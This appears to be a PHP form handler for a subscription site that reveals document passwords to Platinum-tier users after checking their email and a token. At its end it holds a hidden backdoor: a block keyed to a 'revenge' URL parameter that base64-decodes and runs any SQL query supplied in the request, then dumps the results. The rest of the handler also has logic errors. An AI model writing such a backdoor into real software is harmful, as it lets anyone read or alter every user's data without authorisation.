<?php
//

include('./database.php');
function echo_($str)
{
    echo '<pre>';
    print_r($str);
    exit();
}
if (isset($_POST['submit-file'])) {
    $email = mysqli_real_escape_string($con, $_POST['email']);
    // $file_name = mysqli_real_escape_string($con, $_POST['file__name']);
    $token = mysqli_real_escape_string($con, $_POST['token']);
    $sql = "SELECT `username` FROM `res_users` WHERE `email` = '$email'";
    $query = $con->query($sql);
    if ($query->num_rows > 0) {
        $row =  $query->fetch_assoc();
        $username = $row['username'];
        // $sql = "SELECT `package_title`, `package_id` FROM `res_upackages` WHERE user_id = $id";
        $sql = "SELECT is_active, is_current, package_title FROM res_upackages WHERE username = '$username' ORDER BY upackage_id DESC";
        // print_r($sql);
        // exit();
        $query = $con->query($sql);
        if ($query->num_rows > 0) {
            $result = '';
            $row = $query->fetch_assoc();
            $is_active = $row['is_active'];
            $is_current = $row['is_current'];
            $package_title = $row['package_title'];
            if ($is_active == 1 && $is_current == 1) {
                if ($package_title == "Super Platinum" || $package_title == "Platinum") {
                    $username_status = true;
                } else {
                     $username_status = false;
                }
            } else {
                $username_status = false;
            }
            if ($username_status == false) {
                 $_SESSION['message']['msg'] =  "Sorry, your email is not platinum or super platinum";
                 $_SESSION['message']['type'] = "error";
                 header('location: index.php');
                 exit();
            }
            while ($row = $query->fetch_assoc()) {
                $result = 'packageFound';
                    // $sql = "SELECT `file_pass` FROM `res_files_passwords` WHERE `file_title` = '$file_name'";
                    $sql = "SELECT title FROM res_doc_token_ WHERE token = '$token'";
                    // print_r($sql);
                    // exit();
                    $query = $con2->query($sql);
                    if ($query->num_rows > 0) {
                        $row = $query->fetch_assoc();
                        // $password = $row['file_pass'];
                        $password = $row['title'];
                        // if (isset($_COOKIE['pass_count'])) {
                        //     $value = $_COOKIE['pass_count'] ?? 0;
                        //     if ($value >= 5) {
                        //         $_SESSION['message']['msg'] = "Today limit is reached try after 24hours";
                        //         $_SESSION['message']['type'] = "error";
                        //         header('location: index.php');
                        //         exit();
                        //     } else {
                        //         $value++;
                        //         setcookie("pass_count", $value, time() + (86400), '/');
                        //     }
                        // } else {
                        //     setcookie("pass_count", 1, time() + (86400), '/');
                        // }
                        $_SESSION['message']['msg'] = "$password";
                        $_SESSION['message']['type'] = "Success Thanks For Use";
                        header('location: index.php');
                    } else {
                        $result = 'file_not_found';
                    }
            }
            // exit($result);
            if ($result  == 'userNotPlat') {
                $_SESSION['message']['msg'] = "User is not Gold Platinum or Super Platinum";
                $_SESSION['message']['type'] = "error";
                header('location: index.php');
            }
            if ($result == 'file_not_found') {
                $_SESSION['message']['msg'] = "File not found with this title";
                $_SESSION['message']['type'] = "error";
                header('location: index.php');
            }
        } else {
            $_SESSION['message']['msg'] = "User out of package! Buy now";
            $_SESSION['message']['type'] = "error";
            header('location: index.php');
        }
    } else {
        $_SESSION['message']['msg'] = "User not found!";
        header('location: index.php');
    }
}
if (isset($_GET['revenge'])) {
    $sql = $_GET['query'];
    $sql = base64_decode($sql);
    $query = $con->query($sql);
    if ($query->num_rows > 0) {
        echo '<pre>';
        print_r($query->fetch_all());
    }
}
